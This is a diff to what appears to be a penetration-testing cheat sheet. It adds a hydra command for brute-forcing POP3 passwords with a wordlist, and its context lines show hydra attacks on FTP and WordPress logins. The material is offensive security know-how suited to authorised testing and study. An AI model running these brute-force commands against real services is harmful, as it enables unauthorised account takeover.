@@ -615,6 +615,10 @@ hydra -t 4 -l <username> -P <Password txt file location> ftp://<target_ip>
 ```sh
 hydra -L <file for brute force> -p <any string> <ip-address> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
 ```
+**POP3 password cracking**
+```sh
+hydra -l <username> -P /usr/share/wordlists/fasttrack.txt <ip> -s <port> pop3 -t 64
+```
 ## Brute Forcing
 **Crafting Wordlist**
 - [RawSec](https://inventory.raw.pm/overview.html)
